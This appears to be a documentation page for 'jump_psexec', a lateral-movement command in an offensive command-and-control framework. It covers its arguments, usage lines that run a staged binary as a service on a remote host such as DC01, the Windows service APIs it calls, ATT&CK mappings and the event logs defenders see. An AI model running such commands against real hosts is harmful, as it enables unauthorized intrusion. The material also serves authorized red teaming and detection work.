+++
title = "jump_psexec"
chapter = false
weight = 103
+++

## Summary

Lateral movement via remote service creation. Creates and starts a Windows service on a remote host that executes the specified binary.

- **Needs Admin:** True
- **Version:** 1
- **Author:** @Lavender-exe

### Arguments

- **hostname** (String, required) - Target hostname or IP address.
- **service_name** (String, optional) - Service name to create on the remote host. Default: `StarSvc`.
- **binary_path** (String, required) - Full UNC path to the binary to execute as a service (e.g., `\\server\share\payload.exe`).

### Usage

```
jump_psexec -hostname DC01 -binary_path \\10.0.0.5\share\svc.exe
```

```
jump_psexec -hostname DC01 -service_name UpdateSvc -binary_path \\10.0.0.5\share\svc.exe
```

## Detailed Summary

Connects to the remote host's Service Control Manager (SCM) and creates a new service:

1. Opens SCM on the remote host via `OpenSCManagerW`
2. Creates a new service with `CreateServiceW` (SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START)
3. Starts the service with `StartServiceW`
4. Optionally deletes the service after execution with `DeleteService`

The binary path must be accessible from the remote host (typically a UNC path to a writable share).

### APIs Used

| API | Purpose |
|-----|---------|
| `OpenSCManagerW` | Connect to remote SCM |
| `CreateServiceW` | Create service entry |
| `StartServiceW` | Start the service |
| `DeleteService` | Remove service after execution |
| `CloseServiceHandle` | Clean up SCM handles |

## MITRE ATT&CK Mapping

- **T1021.002** - Remote Services: SMB/Windows Admin Shares
- **T1569.002** - System Services: Service Execution

## OPSEC Considerations

{{% notice warning %}}
Service creation on remote hosts is a well-known lateral movement technique. It generates Windows Security Event 7045 (new service installed), Event 4697, and is commonly detected by EDR products.
{{% /notice %}}

- Requires local administrator privileges on the target host
- The service binary must be staged on an accessible share first
- Service creation events are logged in the System event log
- The service name is visible in `services.msc` and `sc query` on the target
- Consider using a `service_exe` output format payload for proper SCM integration
